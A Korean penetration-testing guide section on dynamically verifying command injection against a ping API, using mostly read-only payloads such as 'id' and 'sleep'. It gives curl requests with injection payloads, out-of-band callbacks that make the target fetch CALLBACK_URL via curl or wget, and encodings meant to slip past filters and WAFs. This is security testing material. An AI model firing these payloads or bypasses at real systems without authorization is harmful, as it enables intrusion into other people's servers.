### Phase 2: 동적 테스트 (검증)


**테스트 방법:**
1. curl로 Command Injection 페이로드가 포함된 요청을 전송
2. 응답에서 추가 명령어의 실행 결과가 반환되는지 확인
3. Blind Command Injection의 경우 시간 기반 테스트(sleep) 또는 외부 콜백으로 확인

**안전한 페이로드 (읽기 전용, 파괴적이지 않은 명령어):**
- `; id` / `| id` / `&& id` — 현재 사용자 정보 (무해)
- `; cat /etc/hostname` — 호스트명 (무해)
- `$(id)` / `` `id` `` — 명령어 치환
- `; sleep 5` — 시간 기반 Blind 테스트 (응답 지연 확인)

**curl 예시:**
```
curl "https://target.com/api/ping?host=127.0.0.1%3Bid"
curl "https://target.com/api/ping?host=127.0.0.1%7Cid"
curl "https://target.com/api/ping?host=%24(id)"
```

**Blind Command Injection 테스트:**
```
# 시간 기반 (기준선 측정 필수)
curl -w "\ntime_total: %{time_total}\n" "https://target.com/api/ping?host=127.0.0.1"
curl -w "\ntime_total: %{time_total}\n" "https://target.com/api/ping?host=127.0.0.1%3Bsleep+5"

# 외부 콜백 기반
curl "https://target.com/api/ping?host=127.0.0.1%3Bcurl+https://CALLBACK_URL/cmd-test"
curl "https://target.com/api/ping?host=127.0.0.1%3Bwget+https://CALLBACK_URL/cmd-test"
```

**필터 우회 페이로드 (기본 페이로드 차단 시):**
```
# IFS 공백 대체 (공백 필터 우회)
curl "https://target.com/api/ping?host=127.0.0.1%3Bcat%24%7BIFS%7D/etc/hostname"

# Hex 인코딩
curl "https://target.com/api/ping?host=127.0.0.1%3B%24'%5Cx63%5Cx61%5Cx74'+/etc/hostname"

# 와일드카드 (명령어 이름 필터 우회)
curl "https://target.com/api/ping?host=127.0.0.1%3B/e??/hostn*"

# 빈 변수 삽입 (키워드 필터 우회)
curl "https://target.com/api/ping?host=127.0.0.1%3Bc%24()at+/etc/hostname"

# 줄바꿈 삽입
curl "https://target.com/api/ping?host=127.0.0.1%0aid"

# 백틱 대안
curl "https://target.com/api/ping?host=%60id%60"

# Windows 대상
curl "https://target.com/api/ping?host=127.0.0.1%26+dir"
curl "https://target.com/api/ping?host=127.0.0.1%7C+type+C:%5CWindows%5Cwin.ini"
```

**응답 분석 기준:**

| 응답 유형 | 판단 |
|-----------|------|
| 응답에 `uid=` 또는 사용자 정보 반영 | 확인됨 |
| 응답에 `/etc/hostname` 내용 반영 | 확인됨 |
| 기준선 대비 5초+ 지연 (3회 반복 일관) | 확인됨 (Blind) |
| 콜백 서비스에서 요청 수신 | 확인됨 (OOB) |
| 입력 검증 에러 (`invalid hostname`, `only alphanumeric`) | 안전 |
| 명령어 실행 에러 (`command not found` 등이 아닌 앱 에러) | 안전 |
| WAF 차단 (403) | 우회 기법 시도 |

**검증 기준:**
- **확인됨**: 동적 테스트로 주입한 명령어의 실행 결과가 반환되거나 시간 지연이 확인됨
